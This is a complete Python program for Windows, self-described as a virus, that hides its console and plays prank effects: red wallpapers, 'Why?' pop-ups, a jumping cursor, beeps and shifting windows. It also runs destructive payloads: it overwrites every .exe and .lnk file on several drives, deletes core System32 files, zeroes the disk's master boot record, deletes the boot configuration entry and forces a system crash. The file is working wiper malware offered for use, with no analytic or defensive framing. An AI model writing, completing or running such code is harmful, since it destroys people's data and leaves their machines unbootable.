import os
import sys
import time
import random
import threading
import ctypes
import winreg
import shutil
import subprocess
from pathlib import Path
from PIL import Image, ImageDraw
import win32api
import win32con
import win32gui

# -------------------------------------------------------------------
# The virus literally makes the OS rot.
# -------------------------------------------------------------------

def set_red_wallpaper():
    """Установка красных обоев перед входом"""
    try:
        import ctypes
        SPI_SETDESKWALLPAPER = 20
        red_img_path = os.environ['TEMP'] + "\\red_wall.bmp"
        
        img = Image.new('RGB', (1920, 1080), color=(255, 0, 0))
        img.save(red_img_path, 'BMP')
        
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, red_img_path, 3)
    except:
        pass

def show_why_messages():
    messages = ["Why?..", "Why?..", "Why?.."]
    for msg in messages:
        ctypes.windll.user32.MessageBoxW(0, msg, "SYSTEM", 0x10 | 0x1000)
        time.sleep(1)

def random_wallpaper_changer():
    colors = [(255,0,0), (0,0,0), (100,0,0), (50,0,0), (150,0,0), (200,0,0)]
    
    def change():
        while True:
            try:
                color = random.choice(colors)
                img_path = os.environ['TEMP'] + f"\\wall_{random.randint(1,999)}.bmp"
                img = Image.new('RGB', (1920, 1080), color=color)
                img.save(img_path, 'BMP')
                ctypes.windll.user32.SystemParametersInfoW(20, 0, img_path, 3)
                time.sleep(random.uniform(0.5, 3))
            except:
                pass
    threading.Thread(target=change, daemon=True).start()

def corrupt_executables():
    drives = ['C:\\', 'D:\\', 'E:\\'] if os.name == 'nt' else ['/']
    
    def corrupt():
        while True:
            for drive in drives:
                try:
                    if os.path.exists(drive):
                        for root, dirs, files in os.walk(drive):
                            for file in files:
                                if file.endswith(('.exe', '.lnk')):
                                    try:
                                        filepath = os.path.join(root, file)
                                        with open(filepath, 'w') as f:
                                            f.write("WHY???" * 1000)
                                        os.rename(filepath, filepath + ".WHY")
                                    except:
                                        pass
                except:
                    pass
            time.sleep(5)
    threading.Thread(target=corrupt, daemon=True).start()

def create_hieroglyphs():
    hieroglyphs = ['鬼', '死', '亡', '悪', '魔', '咒', '怨', '靈', '滅', '殺', '血', '獄']
    
    def draw_glyphs():
        hwnd = win32gui.GetDesktopWindow()
        dc = win32gui.GetDC(hwnd)
        
        while True:
            try:
                x = random.randint(0, 1920)
                y = random.randint(0, 1080)
                glyph = random.choice(hieroglyphs)
                color = random.choice([0x0000FF, 0xFF0000, 0xFFFFFF])
                win32gui.TextOut(dc, x, y, glyph)
                time.sleep(0.05)
            except:
                pass
    for _ in range(20):
        threading.Thread(target=draw_glyphs, daemon=True).start()

def crazy_cursor():
    import ctypes.wintypes
    
    def move():
        while True:
            try:
                x = random.randint(0, 1920)
                y = random.randint(0, 1080)
                ctypes.windll.user32.SetCursorPos(x, y)
                time.sleep(0.01)
            except:
                pass
    threading.Thread(target=move, daemon=True).start()

def strange_sounds():
    def play():
        import winsound
        frequencies = [37, 43, 51, 61, 73, 87, 103, 123, 146, 175, 208, 247, 294, 349, 415, 494]
        while True:
            try:
                freq = random.choice(frequencies)
                duration = random.randint(50, 500)
                winsound.Beep(freq, duration)
                time.sleep(random.uniform(0.05, 0.5))
            except:
                pass
    for _ in range(8):
        threading.Thread(target=play, daemon=True).start()

def liquid_screen():
    time.sleep(30)
    
    def distort():
        hwnd = win32gui.GetDesktopWindow()
        while True:
            try:
                # Искажение координат окон
                windows = []
                win32gui.EnumWindows(lambda hwnd, _: windows.append(hwnd), None)
                
                for hwnd in windows:
                    try:
                        rect = win32gui.GetWindowRect(hwnd)
                        if rect[2] - rect[0] > 0:
                            new_x = rect[0] + random.randint(-100, 100)
                            new_y = rect[1] + random.randint(-100, 100)
                            win32gui.SetWindowPos(hwnd, None, new_x, new_y, 
                                                  rect[2]-rect[0], rect[3]-rect[1], 0)
                    except:
                        pass
                time.sleep(0.05)
            except:
                pass
    
    def color_shift():
        while True:
            try:
                # Десктоп в инверсию
                ctypes.windll.user32.SetProcessDPIAware()
                time.sleep(0.1)
            except:
                pass
    
    threading.Thread(target=distort, daemon=True).start()
    threading.Thread(target=color_shift, daemon=True).start()

def kill_system_forever():
    time.sleep(35)  # После эффекта жидкости
    
    # Удаление критических системных файлов
    critical_paths = [
        "C:\\Windows\\System32\\winlogon.exe",
        "C:\\Windows\\System32\\lsass.exe",
        "C:\\Windows\\System32\\csrss.exe",
        "C:\\Windows\\System32\\services.exe"
    ]
    
    for path in critical_paths:
        try:
            if os.path.exists(path):
                os.remove(path)
        except:
            pass
    
    # MBR
    try:
        if os.name == 'nt':
            import struct
            with open("\\\\.\\PhysicalDrive0", "rb+") as mbr:
                mbr.write(b'\x00' * 512)  # Затирание MBR
    except:
        pass
    
    # BCD
    try:
        subprocess.run(['bcdedit', '/delete', '{default}', '/f'], capture_output=True)
    except:
        pass
    
    # Final Crash
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
    except:
        pass
    
    # BSOD
    try:
        ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
        os.system("taskkill /f /im csrss.exe")
    except:
        pass
    
    sys.exit()

def main():

    
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    

    set_red_wallpaper()
    time.sleep(1)
    show_why_messages()
    time.sleep(1)
    

    random_wallpaper_changer()
    corrupt_executables()
    create_hieroglyphs()
    crazy_cursor()
    strange_sounds()
    

    threading.Thread(target=liquid_screen, daemon=True).start()
    

    kill_system_forever()

if __name__ == "__main__":
    main()
